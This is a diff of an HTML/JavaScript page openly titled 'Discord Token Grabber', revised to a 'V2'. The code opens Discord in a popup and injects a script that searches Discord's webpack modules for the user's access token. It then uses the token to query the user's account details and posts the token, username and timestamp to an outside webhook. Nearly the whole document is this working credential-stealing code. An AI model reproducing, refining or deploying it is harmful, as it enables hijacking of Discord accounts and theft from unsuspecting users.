@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Token Grabber</title>
+    <title>Discord Token Grabber V2</title>
     <style>
         body {
             background-color: #2f3136;
@@ -21,33 +21,42 @@
             border-radius: 5px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.2);
             text-align: center;
-            width: 300px;
+            width: 350px;
         }
-        h2 { margin-top: 0; }
+        h2 { margin-top: 0; color: #fff; }
         button {
             background-color: #5865F2;
             color: white;
             border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
+            padding: 12px 24px;
+            border-radius: 4px;
             cursor: pointer;
             font-size: 16px;
+            font-weight: bold;
             width: 100%;
+            transition: background 0.2s;
         }
         button:hover { background-color: #4752c4; }
+        button:disabled { background-color: #4f545c; cursor: not-allowed; }
         #status {
             margin-top: 15px;
             font-size: 14px;
-            color: #b9bbbe;
+            min-height: 20px;
         }
+        .success { color: #43b581; }
+        .error { color: #f04747; }
+        .loading { color: #faa61a; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>Grab Token</h2>
-    <button id="grabBtn">Click to Grab</button>
-    <div id="status">Waiting...</div>
+    <h2>Discord Token Grabber</h2>
+    <p style="font-size: 14px; color: #b9bbbe; margin-bottom: 20px;">
+        Click below to open Discord. Wait for it to fully load, then the token will be sent automatically.
+    </p>
+    <button id="grabBtn">Open & Grab Token</button>
+    <div id="status"></div>
 </div>
 
 <script>
@@ -57,103 +66,149 @@
     const statusEl = document.getElementById('status');
     const grabBtn = document.getElementById('grabBtn');
 
-    function log(msg, type = 'normal') {
+    function setStatus(msg, type = '') {
         statusEl.textContent = msg;
-        statusEl.style.color = type === 'error' ? '#f04747' : type === 'success' ? '#43b581' : '#b9bbbe';
+        statusEl.className = type;
     }
 
     grabBtn.addEventListener('click', async () => {
-        log('Opening Discord...');
-        
-        // Open the actual app interface in a popup
-        const popup = window.open('https://discord.com/app', 'discord-popup', 'width=800,height=600');
+        grabBtn.disabled = true;
+        setStatus('Opening Discord...', 'loading');
+
+        // Open the popup
+        const popup = window.open('https://discord.com/app', 'discord-popup', 'width=900,height=700');
 
         if (!popup) {
-            log('Popup blocked! Please allow popups for this site.', 'error');
+            setStatus('Popup blocked! Please allow popups.', 'error');
+            grabBtn.disabled = false;
             return;
         }
 
-        // Script to extract token from Discord's internal state
+        // Check if popup is closed
+        const closeCheck = setInterval(() => {
+            if (popup.closed) {
+                clearInterval(closeCheck);
+                if (!statusEl.textContent.includes('Success') && !statusEl.textContent.includes('Failed')) {
+                    setStatus('Popup closed without grabbing token.', 'error');
+                    grabBtn.disabled = false;
+                }
+            }
+        }, 1000);
+
+        // Inject script when popup loads
+        popup.onload = () => {
+            // Wait for React to render
+            setTimeout(() => {
+                injectScript(popup);
+            }, 1500);
+        };
+
+        // Listen for token message from popup
+        window.addEventListener('message', async (event) => {
+            if (event.data && event.data.type === 'TOKEN_FOUND') {
+                const token = event.data.token;
+                setStatus('Token found! Sending to webhook...', 'loading');
+                
+                const success = await sendToDiscord(token);
+                if (success) {
+                    setStatus('Token Sent Successfully!', 'success');
+                    popup.close();
+                } else {
+                    setStatus('Failed to send webhook.', 'error');
+                }
+                grabBtn.disabled = false;
+                clearInterval(closeCheck);
+            }
+        });
+    });
+
+    function injectScript(popupWindow) {
         const script = document.createElement('script');
         script.textContent = `
             (function() {
-                function getToken() {
-                    // Search through webpack modules for the token
-                    if (window.webpackChunkdiscord_app) {
-                        for(let i in window.webpackChunkdiscord_app) {
-                            try {
-                                const chunk = window.webpackChunkdiscord_app[i];
-                                if(chunk && chunk.m) {
-                                    for(let j in chunk.m) {
-                                        const module = chunk.m[j];
-                                        if(module && module.z && module.z.accessToken) {
-                                            return module.z.accessToken;
-                                        }
-                                        // Fallback for newer versions
-                                        if(module && module.exports && module.exports.Z && module.exports.Z.accessToken) {
-                                            return module.exports.Z.accessToken;
-                                        }
-                                    }
+                function getTokens() {
+                    const tokens = [];
+                    try {
+                        // Access webpack modules
+                        const modules = Object.values(popupWindow.webpackChunkdiscord_app.push([[''], {}, (e) => { e.m; }])[1]);
+                        for (const module of modules) {
+                            if (module && module.z && module.z.getAccessToken) {
+                                const token = module.z.getAccessToken();
+                                if (token && !tokens.includes(token)) {
+                                    tokens.push(token);
                                 }
-                            } catch(e) {}
+                            }
+                            // Fallback: Directly access the store
+                            if (module && module.default && module.default.getUser) {
+                                const token = module.default._token;
+                                if (token && !tokens.includes(token)) {
+                                    tokens.push(token);
+                                }
+                            }
                         }
+                    } catch (e) {
+                        console.log("Error getting tokens via webpack", e);
                     }
-                    return null;
+                    return tokens;
                 }
 
-                let token = getToken();
-                if(token) {
-                    window.parent.postMessage({token: token}, '*');
-                    window.close();
+                const tokens = getTokens();
+                if (tokens.length > 0) {
+                    window.parent.postMessage({ type: 'TOKEN_FOUND', token: tokens[0] }, '*');
                 } else {
-                    // Retry after a short delay if token is not yet loaded
+                    // Retry if not found
                     setTimeout(() => {
-                        token = getToken();
-                        if(token) {
-                            window.parent.postMessage({token: token}, '*');
-                            window.close();
+                        const retryTokens = getTokens();
+                        if(retryTokens.length > 0) {
+                            window.parent.postMessage({ type: 'TOKEN_FOUND', token: retryTokens[0] }, '*');
                         }
                     }, 2000);
                 }
             })();
         `;
-
-        popup.onload = () => {
-            popup.document.body.appendChild(script);
-        };
-
-        // Listen for the token message from the popup
-        window.addEventListener('message', async (event) => {
-            if (event.data && event.data.token) {
-                log('Token found! Sending...', 'success');
-                await sendWebhook(event.data.token);
-                popup.close();
-            }
-        });
-
-        // Timeout check
-        setTimeout(() => {
-            if(popup && !popup.closed) {
-                try {
-                    popup.postMessage({type: 'get_token'}, '*');
-                } catch(e) {}
-            }
-        }, 5000);
-    });
-
-    async function sendWebhook(token) {
+        
         try {
+            popupWindow.document.body.appendChild(script);
+        } catch (e) {
+            console.error("Injection failed", e);
+        }
+    }
+
+    async function sendToDiscord(token) {
+        try {
+            // Fetch user info to display in webhook
+            const userRes = await fetch('https://discord.com/api/v9/users/@me', {
+                headers: { 'Authorization': token }
+            });
+            
+            let userName = "Unknown User";
+            if (userRes.ok) {
+                const userData = await userRes.json();
+                userName = `${userData.username}#${userData.discriminator} (${userData.id})`;
+            }
+
+            // Send to webhook
             const res = await fetch(WEBHOOK_URL, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `🔓 **New Token**\n\`\`\`${token}\`\`\``
+                    embeds: [{
+                        title: "🔓 New Discord Token Grabbed",
+                        color: 5793266,
+                        fields: [
+                            { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
+                            { name: "User", value: userName, inline: false },
+                            { name: "Time", value: new Date().toLocaleString(), inline: false }
+                        ],
+                        footer: { text: "Grabbed via Webhook" }
+                    }]
                 })
             });
-            if(res.ok) log('Sent!', 'success');
-            else log('Send failed', 'error');
-        } catch(e) {
-            log('Error: ' + e.message, 'error');
+
+            return res.ok;
+        } catch (e) {
+            console.error(e);
+            return false;
         }
     }
 </script>
